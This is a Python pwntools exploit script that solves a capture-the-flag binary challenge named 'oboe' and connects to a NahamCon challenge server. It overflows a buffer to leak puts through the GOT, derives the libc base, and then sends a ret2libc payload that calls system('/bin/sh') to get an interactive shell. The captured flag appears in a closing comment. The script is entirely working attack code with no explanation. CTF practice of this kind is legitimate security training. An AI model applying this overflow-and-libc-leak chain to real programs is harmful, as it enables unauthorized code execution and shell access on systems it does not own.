#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./oboe_patched")
libc = ELF("./libc6-i386_2.27-3ubuntu1.5_amd64.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote('challenge.nahamcon.com', 31613)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	offset = cyclic_find(0x66616161)

	payload = b''.join([
		cyclic(offset),
		p32(exe.symbols['puts']),
		p32(exe.symbols['main']),
		p32(exe.got['puts']),
	])

	r.recvuntil(b'protocol:\n')
	r.sendline(b"A" * 64)
	r.recvuntil(b'domain:\n')
	r.sendline(b"B" * 64)
	r.recvuntil(b'path:\n')
	payload = payload.ljust(56)
	r.sendline(payload)

	r.recvline()
	r.recvline()
	libc_leak = u32(r.recv(4))
	libc.address = libc_leak - libc.symbols['puts']
	success(f'{hex(libc_leak)=}')
	success(f'{hex(libc.address)=}')

	system = libc.symbols['system']
	bin_sh = next(libc.search(b"/bin/sh\x00"))
	success(f'{hex(system)=}')
	success(f'{hex(bin_sh)=}')

	payload = b''.join([
		cyclic(offset),
		p32(system),
		p32(exe.symbols['main']),
		p32(bin_sh),
	])

	r.recvuntil(b'protocol:\n')
	r.sendline(b"A" * 64)
	r.recvuntil(b'domain:\n')
	r.sendline(b"B" * 64)
	r.recvuntil(b'path:\n')
	payload = payload.ljust(56)
	r.sendline(payload)


	r.interactive()


if __name__ == "__main__":
	main()

# flag{a9e49be5177047784b9f7e3a5bf1d864}
